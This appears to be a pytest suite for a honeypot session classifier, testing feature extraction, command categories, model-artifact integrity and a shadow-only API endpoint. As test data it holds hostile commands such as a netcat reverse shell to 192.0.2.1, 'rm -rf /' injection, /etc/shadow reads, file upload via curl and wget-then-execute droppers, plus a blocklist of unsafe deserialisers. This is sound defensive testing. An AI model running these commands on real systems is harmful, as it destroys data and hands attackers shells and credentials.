"""
Honeypot-session ML: feature contract, artifact safety, shadow inference, gated export and the engine endpoint
(docs/SESSION_ML.md, "How it is verified").

Every model artifact here is built in pytest's tmp_path from SYNTHETIC sessions and marked "test_only", which the
engine refuses to load unless a test opts in. Nothing is written to ai-engine/models; the network-flow model, its
53-feature contract and the Q-tables are never touched (asserted).
"""
import hashlib
import json
import math
import os
import random
import sys
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))
from session_ml import classifier as C  # noqa: E402
from session_ml import features as F  # noqa: E402
from session_ml import pipeline as P  # noqa: E402

MODELS = Path(__file__).resolve().parent.parent / "models"
T0 = 1_760_000_000.0


def _models_snapshot():
    return {p.name: hashlib.sha256(p.read_bytes()).hexdigest() for p in MODELS.iterdir() if p.is_file()}


MODELS_BEFORE = _models_snapshot()


@pytest.fixture(autouse=True)
def models_dir_untouched(monkeypatch):
    monkeypatch.delenv("SESSION_ML_MODE", raising=False)
    monkeypatch.delenv("SESSION_ML_MODEL_DIR", raising=False)
    yield
    assert _models_snapshot() == MODELS_BEFORE
    assert not (MODELS / "session_ml").exists()


def cmd(text, intent=None, t=None):
    return {"command": text, "intent": intent, "timestamp": t}


# ── feature contract ──────────────────────────────────────────────────────────────────────────────────────────────
def test_schema_is_versioned_ordered_documented_and_a_superset_of_v1():
    assert F.SCHEMA_VERSION == "session_v2"
    assert len(F.FEATURE_NAMES) == len(set(F.FEATURE_NAMES)) == 46
    assert tuple(F.FEATURE_SPEC) == F.FEATURE_NAMES
    assert all(s["type"] == "float" and s["definition"] and s["group"] for s in F.FEATURE_SPEC.values())
    v1 = ["n_commands", "unique_command_ratio", "distinct_programs", "bigram_diversity", "duration_seconds",
          "login_succeeded", "failed_logins", "gap_mean_s", "gap_median_s", "gap_std_s", "max_command_length",
          "pipes_and_redirects", "downloads", "executes_downloaded", "fingerprint_commands", "ioc_count"]
    assert F.FEATURE_NAMES[: len(v1)] == tuple(v1)
    assert P.FEATURE_VERSION == F.SCHEMA_VERSION and sorted(P.extract_features({})) == P.FEATURE_NAMES


SCHEMA_FINGERPRINT = hashlib.sha256(",".join(F.FEATURE_NAMES).encode()).hexdigest()[:16]


def test_schema_fingerprint_is_the_committed_one():
    # Pinned: changing feature names or their order needs a new SCHEMA_VERSION (and a retrained artifact)
    assert SCHEMA_FINGERPRINT == "a5b929276f7f310a" or pytest.fail(
        f"session feature schema changed ({SCHEMA_FINGERPRINT}); bump SCHEMA_VERSION and update this pin")


def test_authentication_features_count_without_exposing_names_or_passwords():
    s = {"credentials": [{"username": "root", "password": "hunter2", "success": False},
                         {"username": "admin", "password": "123456", "success": False},
                         {"username": "root", "password": "toor", "success": True}],
         "failedLogins": 1}
    f, q = F.extract(s)
    assert (f["login_attempts"], f["failed_logins"], f["login_succeeded"], f["distinct_usernames"]) == (3, 2, 1, 2)
    text = json.dumps([f, q])
    assert "hunter2" not in text and "root" not in text and "admin" not in text
    g, _ = F.extract({"loginSucceeded": True, "failedLogins": 4})  # backend payload: counts only
    assert (g["login_attempts"], g["failed_logins"], g["distinct_usernames"]) == (5, 4, 0)


@pytest.mark.parametrize("text,expected", [
    ("uname -a", {"recon_system"}), ("cat /proc/cpuinfo", {"recon_system"}),
    ("whoami", {"recon_user"}), ("cat /etc/passwd", {"recon_user"}),
    ("ifconfig; netstat -an", {"recon_network"}), ("ls -la /tmp", {"recon_filesystem"}),
    ("cat /etc/shadow", {"credential_access"}),
    ("sudo -l", {"privilege_escalation"}), ("chmod 4755 /tmp/x", {"privilege_escalation", "file_modification"}),
    ("echo key >> ~/.ssh/authorized_keys", {"persistence", "file_modification"}),
    ("crontab -l", {"persistence"}), ("rm -rf /tmp/x", {"file_modification"}),
    ("curl -T /etc/hosts http://192.0.2.1/u", {"upload", "recon_network"}), ("scp x u@h:/", {"upload"}),
    ("nc -lvp 4444", {"network_tools"}), ("nmap -sS 10.0.0.0/24", {"network_tools"}),
    ("./x.sh", {"shell_execution"}), ("echo aGk= | base64 -d | sh", {"shell_execution"}),
    ("/usr/bin/python3 -c 'print(1)'", {"shell_execution"}),
    ("echo hello", set()), ("", set()),
])
def test_command_categories(text, expected):
    assert set(F.command_categories(text)) == expected


def test_command_session_and_sequence_features():
    s = {"durationSeconds": 120, "deceptionProfile": "debian_11", "loginSucceeded": True, "iocCount": 1,
         "commands": [cmd("uname -a", "RECONNAISSANCE", T0), cmd("wget http://192.0.2.9/x", "MALWARE_DOWNLOAD", T0 + 4),
                      cmd("chmod +x x", None, T0 + 6), cmd("./x", None, None), cmd("uname -a", "RECONNAISSANCE", T0 + 10)]}
    f, q = F.extract(s)
    assert f["n_commands"] == 5 and f["unique_command_ratio"] == pytest.approx(4 / 5)
    assert f["downloads"] == 1 and f["executes_downloaded"] == 1 and f["recon_before_download"] == 1
    assert f["cmd_recon_system"] == 2 and f["cmd_shell_execution"] == 1
    assert f["intent_reconnaissance"] == 2 and f["intent_malware_download"] == 1
    assert f["timestamp_coverage"] == pytest.approx(4 / 5) and f["gap_mean_s"] == pytest.approx(10 / 3)
    assert f["event_count"] == 6 and f["events_per_minute"] == pytest.approx(3.0)
    assert f["persona_debian_11"] == 1 and f["persona_unknown"] == 0
    assert q["malformedCommands"] == 0 and q["missingDuration"] is False


@pytest.mark.parametrize("persona", [None, "windows_srv", "kali", 7])
def test_unsupported_or_unknown_personas_map_to_unknown(persona):
    f, _ = F.extract({"deceptionProfile": persona})
    assert f["persona_unknown"] == 1 and sum(f[f"persona_{p}"] for p in F.SERVABLE_PERSONAS) == 0


@pytest.mark.parametrize("session", [
    None, [], "x", 42, {}, {"commands": None}, {"commands": "ls"}, {"commands": [None, 3, ["a"], {"command": None}]},
    {"durationSeconds": "abc"}, {"durationSeconds": -5}, {"durationSeconds": float("nan")},
    {"durationSeconds": float("inf"), "failedLogins": "many", "iocCount": -1},
    {"credentials": "root:root"}, {"credentials": [None, {"success": True}]},
    {"commands": [{"command": "ls", "timestamp": "not-a-date"}, {"command": "id", "timestamp": float("inf")}]},
])
def test_malformed_sessions_never_raise_and_give_finite_values(session):
    f, q = F.extract(session)
    assert list(f) == list(F.FEATURE_NAMES)
    assert all(isinstance(v, float) and math.isfinite(v) for v in f.values())
    assert F.extract(session) == (f, q)  # deterministic


def test_quality_report_counts_problems():
    _, q = F.extract({"commands": [None, {"command": "x" * (F.MAX_COMMAND_CHARS + 10)}],
                      "durationSeconds": "abc"})
    assert q["malformedCommands"] == 1 and q["truncatedCommands"] == 1 and q["invalidNumbers"] == ["durationSeconds"]
    _, q = F.extract({"commands": [{"command": "ls"}] * (F.MAX_COMMANDS + 3)})
    assert q["ignoredCommands"] == 3
    assert F.extract("nope")[1]["notADict"] is True


def test_hostile_command_text_is_never_executed():
    hostile = ["$(rm -rf /)", "`reboot`", "; shutdown -h now", "| nc 192.0.2.1 4444 -e /bin/sh",
               "\x00\x1b[31m", "A" * 100_000, "${IFS}cat${IFS}/etc/passwd", "'; DROP TABLE x; --"]
    with patch("subprocess.Popen", side_effect=AssertionError("executed")), \
         patch("os.system", side_effect=AssertionError("executed")):
        f, q = F.extract({"commands": [cmd(h) for h in hostile]})
        C.SessionClassifier(model_dir=Path("does-not-exist")).classify({"sessionId": "h", "commands": [cmd(h) for h in hostile]})
    assert f["n_commands"] == len(hostile) and q["truncatedCommands"] == 1


def test_reason_codes_are_observations_not_verdicts():
    f, _ = F.extract({"failedLogins": 5, "commands": [cmd("whoami"), cmd("wget http://x/y")]})
    codes = F.reason_codes(f)
    assert {"REPEATED_FAILED_LOGINS", "OBSERVED_RECON_USER", "DOWNLOAD_ATTEMPT", "RECON_BEFORE_DOWNLOAD",
            "PERSONA_UNKNOWN"} <= set(codes)
    assert not any(w in " ".join(codes) for w in ("MALICIOUS", "ATTACK", "BENIGN"))
    assert F.reason_codes(F.extract({})[0]) == ["NO_COMMANDS", "PERSONA_UNKNOWN"]


# ── synthetic training data (tests only) ─────────────────────────────────────────────────────────────────────────
def synthetic_rows(n=120, method="manual"):
    rng = random.Random(7)
    rows = []
    for i in range(n):
        kind = "dropper" if i % 2 else "recon"
        cmds = (["uname -a", "wget http://192.0.2.10/x.sh", "chmod +x x.sh", "./x.sh"] if kind == "dropper"
                else ["uname -a", "id", "cat /etc/passwd", "ps aux"][: rng.randint(2, 4)])
        t = T0 + i * 21600
        rows.append({"sessionId": f"s{i}", "sourceIP": f"203.0.113.{i}", "label": kind, "method": method,
                     "startTime": t, "session": {"commands": [cmd(c, None, t + k) for k, c in enumerate(cmds)],
                                                 "durationSeconds": rng.randint(10, 300), "loginSucceeded": True,
                                                 "deceptionProfile": rng.choice(F.SERVABLE_PERSONAS)}})
    return rows


def rule(session):
    return "dropper" if any("wget" in c["command"] for c in session["commands"]) else "recon"


LABELS = {"dropper": "fetches and runs a file (synthetic test class)", "recon": "discovery only (synthetic test class)"}
TRAINING = {"source": "synthetic test fixture", "independent": False}


@pytest.fixture
def test_artifact(tmp_path):
    d = tmp_path / "session_ml"
    C.export_model(synthetic_rows(), d, rule, "test-0.1", LABELS, TRAINING, force_for_tests=True)
    return d


# ── gated export and evaluation ──────────────────────────────────────────────────────────────────────────────────
def test_export_refuses_without_independent_labels(tmp_path):
    with pytest.raises(ValueError, match="readiness gate failed"):
        C.export_model(synthetic_rows(method="rule"), tmp_path / "m", rule, "v", LABELS, TRAINING)
    assert not (tmp_path / "m").exists()


def test_export_never_writes_into_the_shipped_models_directory():
    for target in (MODELS, MODELS / "other", MODELS / "session_ml"):
        with pytest.raises(PermissionError):
            C.export_model(synthetic_rows(), target, rule, "v", LABELS, TRAINING, force_for_tests=True)


def test_forced_export_is_test_only_and_reports_full_metrics(test_artifact):
    m = json.loads((test_artifact / "manifest.json").read_text())
    assert m["status"] == "test_only" and m["featureSchemaVersion"] == "session_v2" and m["calibrated"] is False
    assert m["sha256"] == hashlib.sha256((test_artifact / "model.json").read_bytes()).hexdigest()
    ev = m["evaluation"]
    assert ev["trainSessions"] + ev["testSessions"] <= 120 and ev["testSessions"] > 0
    cand = ev["candidate"]
    for key in ("perClass", "macroF1", "confusion", "balancedAccuracy", "samples", "classDistribution", "rocAuc", "prAuc"):
        assert key in cand, key
    assert "ruleBaseline" in ev and "majorityBaseline" in ev and "time-aware" in ev["split"]
    assert ev["majorityBaseline"]["balancedAccuracy"] == 0.5
    assert "pickle" not in (test_artifact / "model.json").read_text()


def test_export_rejects_label_definitions_that_do_not_match(tmp_path):
    with pytest.raises(ValueError, match="label definitions"):
        C.export_model(synthetic_rows(), tmp_path / "m", rule, "v", {"dropper": "x"}, TRAINING, force_for_tests=True)


# ── artifact loading ──────────────────────────────────────────────────────────────────────────────────────────────
def test_no_model_is_shipped_and_the_default_is_unavailable_shadow():
    c = C.SessionClassifier()
    st = c.status()
    assert st["modelStatus"] == "MODEL_UNAVAILABLE" and st["mode"] == "shadow" and st["shadowOnly"] is True
    r = c.classify({"sessionId": "s1", "commands": [cmd("uname -a")], "evidenceSource": "operator"})
    assert r["status"] == "MODEL_UNAVAILABLE" and r["prediction"] is None and r["score"] is None
    assert r["reasonCodes"] == ["NO_COMMANDS"] or "OBSERVED_RECON_SYSTEM" in r["reasonCodes"]
    assert r["shadowOnly"] is True and r["evidenceSource"] == "operator" and r["featureSchemaVersion"] == "session_v2"


def test_test_only_artifacts_are_refused_unless_explicitly_allowed(test_artifact):
    assert C.SessionClassifier(model_dir=test_artifact).status()["modelStatus"] == "INVALID_ARTIFACT"
    assert C.SessionClassifier(model_dir=test_artifact, allow_test_artifacts=True).status()["modelStatus"] == "OK"


def _tamper(d, manifest=None, model=None, rehash=True):
    if model is not None:
        m = json.loads((d / "model.json").read_text())
        model(m)
        (d / "model.json").write_text(json.dumps(m))
    man = json.loads((d / "manifest.json").read_text())
    if rehash:
        man["sha256"] = hashlib.sha256((d / "model.json").read_bytes()).hexdigest()
    if manifest is not None:
        manifest(man)
    (d / "manifest.json").write_text(json.dumps(man))


@pytest.mark.parametrize("mutate,status", [
    (dict(model=lambda m: m.update(coef=[[float("nan")] * len(m["featureNames"])])), "INVALID_ARTIFACT"),
    (dict(model=lambda m: m.update(coef=[[0.1]])), "INVALID_ARTIFACT"),
    (dict(model=lambda m: m.update(scalerScale=[0.0] * len(m["featureNames"]))), "INVALID_ARTIFACT"),
    (dict(model=lambda m: m.update(classes=["a", "a"])), "INVALID_ARTIFACT"),
    (dict(model=lambda m: m["featureNames"].reverse()), "INCOMPATIBLE_SCHEMA"),
    (dict(model=lambda m: m.update(format="pickle")), "INVALID_ARTIFACT"),
    (dict(manifest=lambda m: m.update(featureSchemaVersion="session_v1")), "INCOMPATIBLE_SCHEMA"),
    (dict(manifest=lambda m: m.update(sha256="0" * 64)), "INVALID_ARTIFACT"),
    (dict(manifest=lambda m: m.update(artifact="../model.json")), "INVALID_ARTIFACT"),
    (dict(manifest=lambda m: m.update(name="xgb_cicids_v1")), "INVALID_ARTIFACT"),
    (dict(manifest=lambda m: m.pop("trainingData")), "INVALID_ARTIFACT"),
    (dict(manifest=lambda m: m.update(labels={"x": "y"})), "INVALID_ARTIFACT"),
    (dict(model=lambda m: m.update(intercept=[1.0]), rehash=False), "INVALID_ARTIFACT"),  # hash no longer matches
])
def test_invalid_or_incompatible_artifacts_are_reported_never_used(test_artifact, mutate, status):
    _tamper(test_artifact, **mutate)
    c = C.SessionClassifier(model_dir=test_artifact, allow_test_artifacts=True)
    assert c.status()["modelStatus"] == status
    r = c.classify({"sessionId": "s", "commands": [cmd("uname -a")]})
    assert r["status"] == status and r["prediction"] is None and r["modelVersion"] is None


@pytest.mark.parametrize("content", [b"", b"{not json", b"\x80\x04\x95pickle-bytes", b"[]", b'"x"'])
def test_corrupt_or_pickled_files_are_rejected_without_deserialising(tmp_path, content):
    d = tmp_path / "m"
    d.mkdir()
    (d / "manifest.json").write_bytes(content)
    with patch("pickle.loads", side_effect=AssertionError("unpickled")), \
         patch("pickle.load", side_effect=AssertionError("unpickled")):
        assert C.SessionClassifier(model_dir=d).status()["modelStatus"] == "INVALID_ARTIFACT"


def test_the_classifier_module_never_uses_unsafe_deserialisers_or_the_flow_model():
    src = Path(C.__file__).read_text(encoding="utf-8") + Path(F.__file__).read_text(encoding="utf-8")
    for banned in ("import pickle", "import joblib", "from joblib", "eval(", "exec(", "import subprocess",
                   "os.system", "from inference", "import inference", "from utils", "import utils"):
        assert banned not in src, banned


# ── shadow inference ──────────────────────────────────────────────────────────────────────────────────────────────
def test_valid_prediction_is_structured_and_shadow_only(test_artifact):
    c = C.SessionClassifier(model_dir=test_artifact, allow_test_artifacts=True)
    r = c.classify({"sessionId": "s-ok", "evidenceSource": "external",
                    "commands": [cmd("uname -a"), cmd("wget http://192.0.2.10/x"), cmd("./x")]})
    assert r["status"] == "OK" and r["prediction"] in ("dropper", "recon") and r["shadowOnly"] is True
    assert 0 <= r["score"] <= 1 and sum(r["scores"].values()) == pytest.approx(1, abs=1e-5)
    assert r["score"] == max(r["scores"].values()) and r["calibrated"] is False
    assert r["modelVersion"] == "test-0.1" and r["modelName"] == "session_classifier"
    assert r["featureSchemaVersion"] == "session_v2" and r["sessionId"] == "s-ok" and r["evidenceSource"] == "external"
    assert "DOWNLOAD_ATTEMPT" in r["reasonCodes"]
    assert "commands" not in r and "wget" not in json.dumps(r)  # no raw command text in the result
    assert c.classify({"sessionId": "s-ok", "commands": [cmd("uname -a")]}) == {
        **c.classify({"sessionId": "s-ok", "commands": [cmd("uname -a")]}), "inferredAt": ANY}


class _Any:
    def __eq__(self, other):
        return True


ANY = _Any()


def test_invalid_model_output_is_an_inference_error_not_a_prediction(test_artifact, monkeypatch):
    c = C.SessionClassifier(model_dir=test_artifact, allow_test_artifacts=True)
    for bad in ({"dropper": float("nan"), "recon": 0.5}, {"dropper": 0.9, "recon": 0.9}, {"dropper": 1.5, "recon": -0.5}):
        monkeypatch.setattr(C, "_scores", lambda m, x, bad=bad: bad)
        r = c.classify({"sessionId": "s", "commands": []})
        assert r["status"] == "INFERENCE_ERROR" and r["prediction"] is None and r["score"] is None
    monkeypatch.setattr(C, "_scores", MagicMock(side_effect=OverflowError("boom")))
    assert c.classify({"sessionId": "s"})["status"] == "INFERENCE_ERROR"


def test_modes_off_and_unknown(test_artifact, monkeypatch):
    c = C.SessionClassifier(model_dir=test_artifact, allow_test_artifacts=True)
    monkeypatch.setenv("SESSION_ML_MODE", "off")
    r = c.classify({"sessionId": "s"})
    assert r["status"] == "DISABLED" and r["prediction"] is None and c.status()["modelStatus"] == "DISABLED"
    monkeypatch.setenv("SESSION_ML_MODE", "active")  # there is no active mode: anything unknown stays shadow
    assert c.classify({"sessionId": "s"})["mode"] == "shadow"
    assert c.classify({"sessionId": "s"})["shadowOnly"] is True


def test_missing_ids_and_invalid_sources_are_reported_honestly():
    c = C.SessionClassifier(model_dir=Path("nowhere"))
    assert c.classify({"commands": []})["sessionId"] is None
    assert c.classify({"sessionId": "", "evidenceSource": "real"})["evidenceSource"] == "unknown"
    assert c.classify("not a session")["status"] == "INVALID_INPUT"


# ── engine endpoint ───────────────────────────────────────────────────────────────────────────────────────────────
@pytest.fixture
def engine(monkeypatch):
    os.environ.setdefault("SENTINEL_KEY", "test-sentinel-secret-key-12345")
    with patch("inference.predictor.SentinelPredictor.load"), \
         patch("inference.predictor.SentinelPredictor.init_explainer"), \
         patch("joblib.load", return_value=MagicMock()):
        import inference.main as main
    from fastapi.testclient import TestClient
    rules = MagicMock()
    rules.predict_from_honeypot.side_effect = lambda _s: {
        "predictedClass": "SSH Brute Force", "threatScore": 0.7, "action": "MONITOR", "severity": "HIGH",
        "classificationMethod": "honeypot_rules", "inferenceTimeMs": 1.0, "featureVector": None}
    C.reset_default()
    with patch("inference.main._notify"), TestClient(main.app) as client:
        monkeypatch.setattr(main, "predictor", rules)  # after startup, which builds the real predictor
        yield client, main, rules, {"X-API-Key": os.environ["SENTINEL_KEY"]}
    C.reset_default()


SESSION = {"sessionId": "e1", "sourceIP": "203.0.113.5", "durationSeconds": 30, "loginSucceeded": False,
           "failedLogins": 4, "commands": [], "deceptionProfile": "ubuntu_22", "evidenceSource": "operator"}


def test_endpoint_keeps_the_rule_result_and_adds_a_separate_shadow_block(engine):
    client, main, rules, h = engine
    r = client.post("/predict/honeypot/internal", json=SESSION, headers=h)
    assert r.status_code == 200
    body = r.json()
    assert body["result"] == rules.predict_from_honeypot(None)  # rule result untouched
    ml = body["sessionML"]
    assert ml["status"] == "MODEL_UNAVAILABLE" and ml["prediction"] is None and ml["shadowOnly"] is True
    assert ml["sessionId"] == "e1" and ml["evidenceSource"] == "operator" and "REPEATED_FAILED_LOGINS" in ml["reasonCodes"]
    assert "203.0.113.5" not in json.dumps(ml)


def test_a_failing_session_classifier_never_breaks_the_rule_path(engine, monkeypatch):
    client, main, rules, h = engine
    monkeypatch.setattr(C, "default_classifier", MagicMock(side_effect=RuntimeError("boom")))
    r = client.post("/predict/honeypot/internal", json=SESSION, headers=h)
    assert r.status_code == 200 and r.json()["result"]["predictedClass"] == "SSH Brute Force"
    assert r.json()["sessionML"]["status"] == "INFERENCE_ERROR" and r.json()["sessionML"]["prediction"] is None


def test_endpoint_validation_size_limit_and_missing_id(engine):
    client, main, rules, h = engine
    assert client.post("/predict/honeypot/internal", json={**SESSION, "durationSeconds": -1}, headers=h).status_code == 422
    big = {**SESSION, "commands": [{"command": "x" * 1000}] * 2500}
    assert client.post("/predict/honeypot/internal", json=big, headers=h).status_code == 413
    r = client.post("/predict/honeypot/internal", json={**SESSION, "sessionId": ""}, headers=h)
    assert r.status_code == 200 and r.json()["sessionML"]["sessionId"] is None


def test_status_endpoint_requires_the_engine_key(engine):
    client, main, rules, h = engine
    assert client.get("/session-ml/status").status_code in (401, 403)
    assert client.get("/session-ml/status", headers={"X-API-Key": "wrong"}).status_code in (401, 403)
    st = client.get("/session-ml/status", headers=h).json()["status"]
    assert st["modelStatus"] == "MODEL_UNAVAILABLE" and st["featureSchemaVersion"] == "session_v2"
    assert st["featureCount"] == 46 and st["shadowOnly"] is True


def test_the_network_flow_contract_is_untouched_and_never_called(engine):
    client, main, rules, h = engine
    from utils.features import FEATURE_NAMES, FEATURE_SCHEMA_VERSION
    assert len(FEATURE_NAMES) == 53 and FEATURE_SCHEMA_VERSION == "v2.1_53feat"
    assert not set(FEATURE_NAMES) & {"login_attempts", "cmd_recon_system", "persona_unknown"}
    rules.predict.reset_mock()
    client.post("/predict/honeypot/internal", json=SESSION, headers=h)
    rules.predict.assert_not_called()  # the flow model's predict() is never used for sessions
